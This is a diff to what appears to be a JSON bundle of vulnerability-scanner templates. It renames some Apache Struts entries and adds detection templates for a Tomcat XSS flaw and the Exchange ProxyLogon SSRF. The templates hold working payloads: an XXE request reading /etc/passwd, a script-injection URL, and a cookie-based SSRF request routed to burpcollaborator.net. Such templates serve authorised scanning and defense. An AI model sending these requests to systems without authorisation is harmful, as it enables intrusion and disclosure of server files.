@@ -468,7 +468,7 @@
       "id": "CVE-2016-3081",
       "info": {
         "author": "dhiyaneshDK",
-        "name": "S2-032 Struts RCE",
+        "name": "Apache S2-032 Struts RCE",
         "reference": "https://cwiki.apache.org/confluence/display/WW/S2-032",
         "severity": "high",
         "tags": "cve,cve2016,struts,rce,apache"
@@ -928,7 +928,7 @@
       "info": {
         "author": "Random Robbie",
         "description": "Struts is vulnerable to remote command injection attacks through incorrectly parsing an attacker’s invalid Content-Type HTTP header. The Struts vulnerability allows these commands to be executed under the privileges of the Web server.",
-        "name": "Struts2 RCE",
+        "name": "Apache Struts2 RCE",
         "severity": "critical",
         "tags": "cve,cve2017,struts,rce,apache"
       },
@@ -2304,6 +2304,47 @@
           "matchers-condition": "and",
           "raw": [
             "POST /webtools/control/xmlrpc HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nAccept-Language: en\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY disclose SYSTEM \"file://///etc/passwd\">]><methodCall><methodName>&disclose;</methodName></methodCall>\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2019-0221",
+      "info": {
+        "author": "pikpikcu",
+        "description": "The SSI printenv command in Apache Tomcat 9.0.0.M1 to 9.0.0.17, 8.5.0 to 8.5.39 and\n7.0.0 to 7.0.93 echoes user provided data without escaping and is,\ntherefore, vulnerable to XSS. SSI is disabled by default.\nThe printenv command is intended for debugging and is unlikely to be present in a production website.\n",
+        "name": "Apache Tomcat XSS",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2019-0221",
+        "severity": "low",
+        "tags": "cve,cve2019,apache,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "<script>alert('xss')</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/printenv.shtml?%3Cscript%3Ealert(%27xss%27)%3C/script%3E"
           ]
         }
       ]
@@ -4917,6 +4958,7 @@
         "author": "dwisiswant0",
         "description": "Zoho ManageEngine OpManager Stable build before 124196 and Released build before 125125 allows an unauthenticated attacker to read arbitrary files on the server by sending a crafted request.",
         "name": "Unauthenticated Zoho ManageEngine OpManger Arbitrary File Read",
+        "reference": "https://github.com/BeetleChunks/CVE-2020-12116",
         "severity": "high",
         "tags": "cve,cve2020,zoho,traversal"
       },
@@ -8116,6 +8158,40 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/ics?tool=search&query=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-26855",
+      "info": {
+        "author": "madrobot",
+        "description": "Microsoft Exchange Server Remote Code Execution Vulnerability This CVE ID is unique from CVE-2021-26412, CVE-2021-26854, CVE-2021-26857, CVE-2021-26858, CVE-2021-27065, CVE-2021-27078.\n",
+        "name": "Exchange Server SSRF Vulnerability",
+        "reference": "- https://proxylogon.com/#timeline\n- https://raw.githubusercontent.com/microsoft/CSS-Exchange/main/Security/http-vuln-cve2021-26855.nse\n- https://www.shodan.io/search?query=vuln%3ACVE-2021-26855\n- https://gist.github.com/testanull/324546bffab2fe4916d0f9d1f03ffa09\n",
+        "severity": "critical",
+        "tags": "cve,cve2021,ssrf,rce,exchange"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "Burp Collaborator Server"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "GET /owa/auth/x.js HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nCookie: X-AnonResource=true; X-AnonResource-Backend=burpcollaborator.net/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;\nAccept-Language: en\nConnection: close\n"
           ]
         }
       ]
